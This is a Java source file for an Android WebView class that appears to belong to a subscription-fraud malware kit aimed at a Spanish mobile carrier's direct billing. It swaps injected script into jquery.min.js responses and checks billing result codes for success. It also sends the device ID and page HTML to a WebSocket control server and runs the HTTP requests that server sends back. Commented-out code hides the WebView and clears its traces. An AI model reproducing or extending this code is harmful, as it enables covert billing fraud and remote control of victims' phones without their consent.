package com.enhtmv.sublib.work.spain;

import android.util.ArrayMap;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.RelativeLayout;

import com.alibaba.fastjson.JSON;
import com.blankj.utilcode.util.ConvertUtils;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.ResourceUtils;
import com.blankj.utilcode.util.Utils;
import com.enhtmv.sublib.common.http.SubResponse;
import com.enhtmv.sublib.common.sub.WebViewSubCall;

import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Map;

import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class SpainOrangeWebview extends WebViewSubCall {


    private String logFunc;

    private String script;


    private RelativeLayout layout;

    public SpainOrangeWebview(RelativeLayout layout) {
        super(new WebView(Utils.getApp().getBaseContext()));

        this.layout = layout;

        webView.setWebChromeClient(new WebChromeClient());

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                view.loadUrl(request.getUrl().toString());
                return true;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
            }

            @Override
            public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {

                String url = request.getUrl().toString();

                if (ignore(request)) {
                    return new WebResourceResponse("", "", null);
                }

                if (url.startsWith("http://go-es.allcpx.com/web/sub/result")) {

                    HttpUrl httpUrl = HttpUrl.parse(url);

                    if (httpUrl != null) {
                        String code = httpUrl.queryParameter("dcbErrorCode");

                        if ("0".equals(code) || "150".equals(code)) {
                            success();
                        } else {
                            r.w("error", url);
                        }
                    } else {
                        r.w("error", url);
                    }

                }


                if (url.endsWith("jquery.min.js")) {

                    String jquery = ResourceUtils.readAssets2String("jquery.js") + "\n"
                            + logFunc + "\n"
                            + script;

                    InputStream inputStream = ConvertUtils.string2InputStream(jquery, "utf-8");

                    return new WebResourceResponse("application/javascript; charset=utf-8", "utf-8", inputStream);

                }

                return super.shouldInterceptRequest(view, request);
            }
        });


        for (Method method : JavascriptLog.class.getMethods()) {
            JavascriptInterface annotation = method.getAnnotation(JavascriptInterface.class);
            if (annotation != null) {
                this.logFunc = "function log(tag,info){window.LOG." + method.getName() + "(tag,info)}";
                LogUtils.i("script log method:", logFunc);
                break;
            }
        }
    }

    @Override
    public void sub(String script) {


        OkHttpClient client = new OkHttpClient.Builder().build();

//        Request request = new Request.Builder().url("ws://192.168.31.112:8010/ws").build();
        Request request = new Request.Builder().url("ws://10.0.2.2:8010/ws").build();


        client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                super.onOpen(webSocket, response);

                LogUtils.i("websocket open !");

                try {

                    SubResponse s = http().get("http://offer.allcpx.com/offer/track?offer=271&clickId=" + androidId);

                    if (s.response().code() == 200) {
//                        SubResponse s = http().get("http://pl.ifunnyhub.com/mm/pl/lp");

                        Map<String, String> data = new ArrayMap<>();

                        data.put("location", s.url());
                        data.put("html", s.body());
                        data.put("vid", androidId);

                        webSocket.send(JSON.toJSONString(data));
                    } else {
                        LogUtils.w("error response code", s.response().code());
                    }


                } catch (Exception e) {
                    e.printStackTrace();
                }

            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                super.onMessage(webSocket, text);

                try {
                    RequestObj requestObj = JSON.parseObject(text, RequestObj.class);

                    requestObj.call(http());

                } catch (Exception e) {
                    LogUtils.e(e);
                    r.e("", e);
                }


            }
        });


//        this.script = script;
//
//        handler.post(new Runnable() {
//            @Override
//            public void run() {
//
//                clearCookies();
//
//                LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT);
//
//                webView.setLayoutParams(params);
//
//
//                if (Plugin.isHiden()) {
//                    webView.setVisibility(View.GONE);
//                }
//
//                layout.addView(webView);
//
//                webView.clearHistory();
//                webView.clearCache(true);
//                webView.clearFormData();
//
//
//                report(SUB_REQEUST);
//
//                webView.loadUrl("http://offer.allcpx.com/offer/track?offer=271&clickId=" + androidId);
//            }
//        });

    }


}
